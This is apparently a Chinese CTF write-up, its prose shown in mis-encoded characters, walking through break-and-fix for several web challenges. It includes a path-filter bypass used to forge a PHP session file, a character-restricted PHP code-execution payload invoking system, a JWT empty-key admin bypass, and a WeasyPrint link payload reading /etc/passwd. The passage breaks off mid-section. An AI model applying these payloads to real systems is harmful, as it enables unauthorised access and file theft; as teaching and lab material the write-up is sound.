<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: index.php&#x27;</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;memo&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;memo&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;memos&#x27;</span>][] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;memo&#x27;</span>];<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;backup&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$backupMemos</span> = <span class="hljs-title function_ invoke__">implode</span>(PHP_EOL, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;memos&#x27;</span>]);<br><br>    <span class="hljs-variable">$random</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">8</span>));<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;/tmp/&#x27;</span> . <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] . <span class="hljs-string">&#x27;_&#x27;</span> . <span class="hljs-variable">$random</span>;<br><br>    <span class="hljs-comment">// Handle compression method and file extension</span><br>    <span class="hljs-variable">$compressionMethod</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;compression&#x27;</span>] ?? <span class="hljs-string">&#x27;none&#x27;</span>;<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$compressionMethod</span>) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;gzip&#x27;</span>:<br>            <span class="hljs-variable">$compressedData</span> = <span class="hljs-title function_ invoke__">gzencode</span>(<span class="hljs-variable">$backupMemos</span>);<br>            <span class="hljs-variable">$filename</span> .= <span class="hljs-string">&#x27;.gz&#x27;</span>;<br>            <span class="hljs-variable">$mimeType</span> = <span class="hljs-string">&#x27;application/gzip&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;bzip2&#x27;</span>:<br>            <span class="hljs-variable">$compressedData</span> = <span class="hljs-title function_ invoke__">bzcompress</span>(<span class="hljs-variable">$backupMemos</span>);<br>            <span class="hljs-variable">$filename</span> .= <span class="hljs-string">&#x27;.bz2&#x27;</span>;<br>            <span class="hljs-variable">$mimeType</span> = <span class="hljs-string">&#x27;application/x-bzip2&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;zip&#x27;</span>:<br>            <span class="hljs-variable">$zip</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();<br>            <span class="hljs-variable">$zipFilename</span> = <span class="hljs-variable">$filename</span> . <span class="hljs-string">&#x27;.zip&#x27;</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$zipFilename</span>, <span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">CREATE</span>) === <span class="hljs-literal">true</span>) &#123;<br>                <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$backupMemos</span>);<br>                <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>            &#125;<br>            <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$zipFilename</span>;<br>            <span class="hljs-variable">$mimeType</span> = <span class="hljs-string">&#x27;application/zip&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;none&#x27;</span>:<br>            <span class="hljs-variable">$compressedData</span> = <span class="hljs-variable">$backupMemos</span>;<br>            <span class="hljs-variable">$filename</span> .= <span class="hljs-string">&#x27;.txt&#x27;</span>;<br>            <span class="hljs-variable">$mimeType</span> = <span class="hljs-string">&#x27;text/plain&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-comment">// I don&#x27;t know what extension this is, but I&#x27;ll still give you the file. Don&#x27;t play any tricks, okay~</span><br>            <span class="hljs-variable">$compressedData</span> = <span class="hljs-title function_ invoke__">str_rot13</span>(<span class="hljs-variable">$backupMemos</span>);<br>            <span class="hljs-variable">$filename</span> .= <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$compressionMethod</span>;<br>            <span class="hljs-variable">$mimeType</span> = <span class="hljs-string">&#x27;text/plain&#x27;</span>;<br>            <span class="hljs-keyword">while</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&#x27;../&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>                <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;../&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$filename</span>);<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$compressedData</span>);<br>    <span class="hljs-comment">// Send headers and output file content</span><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Description: File Transfer&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: &#x27;</span> . <span class="hljs-variable">$mimeType</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filename</span>) . <span class="hljs-string">&#x27;&quot;&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Length: &#x27;</span> . <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$filename</span>));<br>    <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$filename</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br><br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;<br>    &lt;title&gt;Memo&lt;/title&gt;<br>    &lt;style&gt;<br>        body &#123;<br>            background-color: beige;<br>            font-family: Arial, sans-serif;<br>        &#125;<br><br>        h1,<br>        h2 &#123;<br>            color: darkslategray;<br>            margin-top: <span class="hljs-number">30</span>px;<br>            margin-bottom: <span class="hljs-number">10</span>px;<br>        &#125;<br><br>        form &#123;<br>            margin: <span class="hljs-number">30</span>px auto;<br>            width: <span class="hljs-number">80</span>%;<br>            padding: <span class="hljs-number">20</span>px;<br>            background-color: white;<br>            border-radius: <span class="hljs-number">10</span>px;<br>            box-shadow: <span class="hljs-number">0</span>px <span class="hljs-number">0</span>px <span class="hljs-number">10</span>px <span class="hljs-number">2</span>px <span class="hljs-title function_ invoke__">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.3</span>);<br>        &#125;<br><br>        label &#123;<br>            display: block;<br>            margin-bottom: <span class="hljs-number">10</span>px;<br>        &#125;<br><br>        input[type=<span class="hljs-string">&quot;text&quot;</span>],<br>        select &#123;<br>            width: <span class="hljs-number">100</span>%;<br>            padding: <span class="hljs-number">10</span>px;<br>            border-radius: <span class="hljs-number">5</span>px;<br>            border: none;<br>            margin-bottom: <span class="hljs-number">20</span>px;<br>        &#125;<br><br>        button[type=<span class="hljs-string">&quot;submit&quot;</span>] &#123;<br>            background-color: darkslategray;<br>            color: white;<br>            border: none;<br>            padding: <span class="hljs-number">10</span>px <span class="hljs-number">20</span>px;<br>            border-radius: <span class="hljs-number">5</span>px;<br>            cursor: pointer;<br>        &#125;<br>    &lt;/style&gt;<br>&lt;/head&gt;<br><br>&lt;body&gt;<br>    &lt;h1&gt;Welcome, <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]); <span class="hljs-meta">?&gt;</span>&lt;/h1&gt;<br>    &lt;form action=<span class="hljs-string">&quot;memo.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<br>        &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;memo&quot;</span>&gt;New Memo:&lt;/label&gt;<br>        &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;memo&quot;</span> id=<span class="hljs-string">&quot;memo&quot;</span> required&gt;<br>        &lt;button type=<span class="hljs-string">&quot;submit&quot;</span>&gt;Add Memo&lt;/button&gt;<br>    &lt;/form&gt;<br>    &lt;h2&gt;Here <span class="hljs-number">1</span>s Your Memos:&lt;/h2&gt;<br>    &lt;ul&gt;<br>        <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;memos&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$memo</span>) : <span class="hljs-meta">?&gt;</span><br>            &lt;li&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$memo</span>); <span class="hljs-meta">?&gt;</span>&lt;/li&gt;<br>        <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endforeach</span>; <span class="hljs-meta">?&gt;</span><br>        <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>] === <span class="hljs-literal">true</span>) : <span class="hljs-meta">?&gt;</span><br>            &lt;li&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>); <span class="hljs-meta">?&gt;</span>&lt;/li&gt; &lt;!-- Only admin can get flag --&gt;<br>        <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endif</span> <span class="hljs-meta">?&gt;</span><br>    &lt;/ul&gt;<br>    &lt;form action=<span class="hljs-string">&quot;memo.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<br>        &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;compression&quot;</span>&gt;Compression method:&lt;/label&gt;<br>        &lt;select name=<span class="hljs-string">&quot;compression&quot;</span> id=<span class="hljs-string">&quot;compression&quot;</span>&gt;<br>            &lt;option value=<span class="hljs-string">&quot;none&quot;</span>&gt;None&lt;/option&gt;<br>            &lt;option value=<span class="hljs-string">&quot;gzip&quot;</span>&gt;GZIP&lt;/option&gt;<br>            &lt;option value=<span class="hljs-string">&quot;bzip2&quot;</span>&gt;BZIP2&lt;/option&gt;<br>            &lt;option value=<span class="hljs-string">&quot;zip&quot;</span>&gt;ZIP&lt;/option&gt;<br>        &lt;/select&gt;<br>        &lt;button type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;backup&quot;</span> value=<span class="hljs-string">&quot;1&quot;</span>&gt;Export Backup&lt;/button&gt;<br>    &lt;/form&gt;<br>&lt;/body&gt;<br><br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>


<p>1ï¼šé¦–å…ˆå¾ˆæ˜æ˜¾ï¼Œå½“<code>$_SESSION[&#39;admin&#39;] === true</code>æ—¶å°±ç»™flagï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¼ªé€ session</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>] === <span class="hljs-literal">true</span>) : <span class="hljs-meta">?&gt;</span><br>            &lt;li&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>); <span class="hljs-meta">?&gt;</span>&lt;/li&gt; &lt;!-- Only admin can get flag --&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endif</span> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>2ï¼šç½‘é¡µæœ‰ä¸ªä¸‹è½½åŠŸèƒ½ç‚¹ï¼Œå¯ä»¥è‡ªå®šä¹‰åç¼€</p>
<p>ä½†æ˜¯è¿‡æ»¤äº†<code>../</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">default</span>:<br>    <span class="hljs-comment">// I don&#x27;t know what extension this is, but I&#x27;ll still give you the file. Don&#x27;t plaany tricks, okay~</span><br>    <span class="hljs-variable">$compressedData</span> = <span class="hljs-title function_ invoke__">str_rot13</span>(<span class="hljs-variable">$backupMemos</span>);<br>    <span class="hljs-variable">$filename</span> .= <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$compressionMethod</span>;<br>    <span class="hljs-variable">$mimeType</span> = <span class="hljs-string">&#x27;text/plain&#x27;</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&#x27;../&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;../&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$filename</span>);<br>    &#125;<br>    <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure>

<p>3ï¼šæ¥ç€<code>file_put_contents</code>å†™åˆ°<code>/tmp</code>ç›®å½•ä¸‹ï¼Œæ ¼å¼ä¸º<code>ç”¨æˆ·å_éšæœºæ•°.æ–‡ä»¶åç¼€</code>ï¼Œå…¶ä¸­ç”¨æˆ·åå’Œæ–‡ä»¶åç¼€æ˜¯å¯æ§çš„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$random</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">8</span>));<br><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;/tmp/&#x27;</span> . <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] . <span class="hljs-string">&#x27;_&#x27;</span> . <span class="hljs-variable">$random</span>;<br><span class="hljs-variable">$compressionMethod</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;compression&#x27;</span>] ?? <span class="hljs-string">&#x27;none&#x27;</span>;<br><span class="hljs-variable">$filename</span> .= <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$compressionMethod</span>;<br><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$compressedData</span>);<br><span class="hljs-comment">// Send headers and output file content</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Description: File Transfer&#x27;</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: &#x27;</span> . <span class="hljs-variable">$mimeType</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filename</span>) . <span class="hljs-string">&#x27;&quot;&#x27;</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Length: &#x27;</span> . <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$filename</span>));<br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$filename</span>);<br></code></pre></td></tr></table></figure>


<p>æ ¹æ®ç¬¬äºŒç‚¹å’Œç¬¬ä¸‰ç‚¹å¯ä»¥å¾—çŸ¥ï¼Œå½“ä¼ <code>compression</code>å€¼ä¸º<code>./</code>æ—¶ï¼Œä¸å‰é¢çš„<code>.</code>ç»„åˆå˜æˆ<code>../</code>ï¼Œç„¶åè¢«æ›¿æ¢æˆç©ºï¼Œå°±å¯ä»¥ä¿®æ”¹æ–‡ä»¶æ ¼å¼ä¸º<code>ç”¨æˆ·å_éšæœºæ•°</code></p>
<p><img src="/img/wp/2023/2023ycb-final-4.png"></p>
<p>è€Œåœ¨phpä¸­ï¼Œsessionæ–‡ä»¶é»˜è®¤ä½ç½®æ˜¯<code>/tmp/sess_PHPSESSID</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æŠŠä¼ªé€ çš„å†…å®¹å†™å…¥æ–‡ä»¶ï¼Œç„¶åè®¾ç½®<code>PHPSESSID</code>å»è®¿é—®</p>
<p>æœ¬é¢˜ç”¨çš„è§£æå¼•æ“æ˜¯é»˜è®¤çš„<code>php</code>ï¼Œæ ¼å¼ä¸º<code>é”®å + ç«–çº¿ + ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</code>ï¼Œä¾‹å¦‚<code>username|s:1:&quot;q&quot;;memos|a:1:&#123;i:0;s:1:&quot;a&quot;;&#125;</code></p>
<p>æˆ‘ä»¬å¯ä»¥ä¼ªé€ ä¸€ä¸ª<code>admin|b:1;username|s:5:&quot;admin&quot;;</code>ï¼Œæ³¨æ„ä»£ç ä¸­è¿˜æœ‰ä¸€å±‚<code>str_rot13</code>ï¼Œå˜æˆ<code>nqzva|o:1;hfreanzr|f:5:&quot;nqzva&quot;;</code></p>
<p>ç„¶åç”¨<code>sess</code>ç™»å½•åå†™å…¥è¿›memos</p>
<p><img src="/img/wp/2023/2023ycb-final-5.png"></p>
<p>è®¾ç½®åç¼€ä¸º<code>./</code>ï¼Œå†™å…¥åˆ°<code>sess_46364caa4533f999</code></p>
<p><img src="/img/wp/2023/2023ycb-final-6.png"></p>
<p>è®¾ç½®<code>PHPSESSID</code>ä¸º<code>46364caa4533f999</code>è®¿é—®æ‹¿åˆ°flag</p>
<p><img src="/img/wp/2023/2023ycb-final-7.png"></p>
<h2 id="Fix-2"><a href="#Fix-2" class="headerlink" title="Fix"></a>Fix</h2><p>æˆ‘çš„ä¿®æ³•åº”è¯¥æ˜¯éé¢„æœŸäº†</p>
<p>ç›´æ¥ä¿®æ”¹è¯»flagçš„å‘½ä»¤å°±è¿‡äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>] === <span class="hljs-literal">true</span>) : <span class="hljs-meta">?&gt;</span><br>            &lt;li&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat flag&quot;</span>); <span class="hljs-meta">?&gt;</span>&lt;/li&gt; &lt;!-- Only admin can get flag --&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endif</span> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>æ­£å¸¸å¯ä»¥è®¾ç½®ä¸€ä¸ªåˆ¤æ–­ï¼Œä½¿ç”¨æˆ·ä¸èƒ½ç­‰äº<code>sess</code>æˆ–è€…åœ¨åç¼€å¤„åŠ ä¸ªç™½åå•ç­‰ç­‰</p>
<h1 id="web-fuzee-rce"><a href="#web-fuzee-rce" class="headerlink" title="web-fuzee_rce"></a>web-fuzee_rce</h1><h2 id="Break-3"><a href="#Break-3" class="headerlink" title="Break"></a>Break</h2><p>å¼±å£ä»¤<code>admin/admin123</code>ç›´æ¥ç™»å½•åè·³è½¬åˆ°<code>goods.php</code>ï¼Œç„¶åå°±æ˜¯ä¸€ç‰‡ç©ºç™½ï¼Œå½“æ—¶æ¯”èµ›æ—¶å°è¯•äº†å‡ ä¸ªå¸¸è§çš„å‚æ•°ï¼Œéƒ½æ²¡è¯•å‡ºæ¥å°±æ”¾å¼ƒäº†ï¼Œåœ¨Fixé˜¶æ®µçœ‹åˆ°æºç åæ²¡æƒ³åˆ°å‚æ•°æ˜¯<code>w1key</code></p>
<p>ä¼ å‚åæ‹¿åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> (<span class="hljs-string">&quot;check.php&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;w1key&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$w1key</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;w1key&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$w1key</span>) &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$w1key</span>) == <span class="hljs-variable">$w1key</span> &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$w1key</span>) &lt;= <span class="hljs-number">3</span> &amp;&amp; <span class="hljs-variable">$w1key</span> &gt; <span class="hljs-number">999999999</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;good&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Please input a valid number!&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;w1key&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$w1key</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;w1key&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">strCheck</span>(<span class="hljs-variable">$w1key</span>);<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$w1key</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>Please input a valid number!<br></code></pre></td></tr></table></figure>

<p>ç¬¬ä¸€ä¸ªifæ²¡å•¥ç”¨ï¼Œè¦è¿‡çš„è¯ç”¨ç§‘å­¦è®¡æ•°æ³•å°±è¡Œ</p>
<p>ç¬¬äºŒä¸ªifå­˜åœ¨ä¸€ä¸ªä»£ç æ‰§è¡Œï¼Œä½†æ˜¯æœ‰ä¸ªwafï¼Œä¼šè¿‡æ»¤ä¸€äº›å­—ç¬¦ï¼ŒåŒæ—¶å­˜åœ¨é•¿åº¦é™åˆ¶</p>
<p>å…ˆfuzzçœ‹ä¸‹èƒ½ç”¨çš„ç¬¦å·</p>
<p><img src="/img/wp/2023/2023ycb-final-8.png"></p>
<p>å¯ä»¥ç”¨è‡ªå¢rce</p>
<p><code>w1key=$%ff=_(%ff/%ff)[%ff];$_=%2b%2b$%ff;$_=_.%2b%2b$%ff.$_;$%ff%2b%2b;$%ff%2b%2b;$_.=%2b%2b$%ff.%2b%2b$%ff;$$_[_]($$_[%ff]);&amp;_=system&amp;%ff=ls</code></p>
<p><img src="/img/wp/2023/2023ycb-final-9.png"></p>
<h2 id="Fix-3"><a href="#Fix-3" class="headerlink" title="Fix"></a>Fix</h2><p>æ¯”èµ›æ—¶ä¿®çš„ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">strCheck</span>(<span class="hljs-params"><span class="hljs-variable">$w1key</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$w1key</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$w1key</span>) &lt;= <span class="hljs-number">83</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[1-9a-zA-Z!,()\[\]\/%+@&#x27;#^&amp;%*:\.&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="hljs-variable">$w1key</span>))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$w1key</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;é»‘å®¢æ˜¯å§ï¼Œæˆ‘çœ‹ä½ æ€ä¹ˆé»‘ï¼&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å¤ªé•¿äº†&quot;</span>);<br>      &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>



<h1 id="web-Oh-My-PDF"><a href="#web-Oh-My-PDF" class="headerlink" title="web-Oh! My PDF"></a>web-Oh! My PDF</h1><h2 id="Break-4"><a href="#Break-4" class="headerlink" title="Break"></a>Break</h2><blockquote>
<p>å¿˜è®°å½“æ—¶æœ‰æ²¡æœ‰ç»™æºç äº†ï¼Œå°±å…ˆå½“æ²¡æœ‰æºç æ¥åˆ†æå§</p>
</blockquote>
<p>æœ‰ä¸ªæ³¨å†Œå’Œç™»å½•åŠŸèƒ½ï¼Œä¸»é¡µé¢çš„åŠŸèƒ½æ˜¯è®¿é—®æä¾›çš„urlå¹¶è½¬æˆpdfç„¶åä¸‹è½½</p>
<p>éšæ„æ³¨å†Œä¸€ä¸ªè´¦å·ç™»å½•åæç¤ºéœ€è¦æ˜¯adminæƒé™æ‰èƒ½æ“ä½œ</p>
<p><img src="/img/wp/2023/2023ycb-final-10.png"></p>
<p>æŠ“åŒ…å‘ç°ä½¿ç”¨äº†jwtï¼Œå°è¯•ç©ºå¯†é’¥ç›´æ¥ä¿®æ”¹isadminçš„å€¼åæˆåŠŸç»•è¿‡</p>
<p><img src="/img/wp/2023/2023ycb-final-11.png"></p>
<p>ç„¶åæ˜¯ä¸»åŠŸèƒ½ç‚¹ï¼Œè¯•äº†ä¸‹ä¸èƒ½ä½¿ç”¨ç±»ä¼¼<code>file://</code>çš„åè®®ï¼Œåªèƒ½ä½¿ç”¨<code>http://</code><br>åœ¨vpsä¸Šå¼€ä¸ªç›‘å¬ï¼Œè®¿é—®åå¯ä»¥çœ‹åˆ°<code>WeasyPrint</code>åº“çš„ç‰¹å¾</p>
<p><img src="/img/wp/2023/2023ycb-final-12.png"></p>
<p>è¿™ä¸ªçˆ¬è™«è™½ç„¶ä¸ä¼šæ¸²æŸ“jsï¼Œä½†æ˜¯å´å¯ä»¥è§£æ<code>&lt;link attachment=xxx&gt;</code>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨vpsä¸Šæ„é€ payloadï¼š <code>&lt;link rel=&quot;attachment&quot; href=&quot;file:///etc/passwd&quot;&gt;</code>æ¥å®ç°ä»»æ„æ–‡ä»¶è¯»å–</p>
<p>ä¾‹å¦‚</p>
